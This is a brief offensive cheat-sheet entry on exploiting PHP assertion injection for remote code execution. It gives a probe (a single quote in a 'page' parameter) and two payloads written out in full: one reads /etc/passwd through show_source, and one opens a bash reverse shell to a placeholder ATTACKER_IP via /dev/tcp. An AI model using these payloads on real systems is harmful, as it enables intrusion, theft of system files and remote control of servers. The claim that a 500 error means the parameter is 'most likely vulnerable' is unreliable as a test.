# PHP Assertions RCE

You can achieve RCE if you can identify this type of vulnerability.

### 1) Identification

On a parameter, try to add a single quote (')

    http://domain.local/index.php?page='

If you get a 500 internal server error, it is most likely vulnerable to RCE.

### 2) Payloads to use

Read files from the machine

    ' and die(show_source('/etc/passwd')) or '

Get a reverse shell

    ' and die(exec('bash -c "/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')) or '
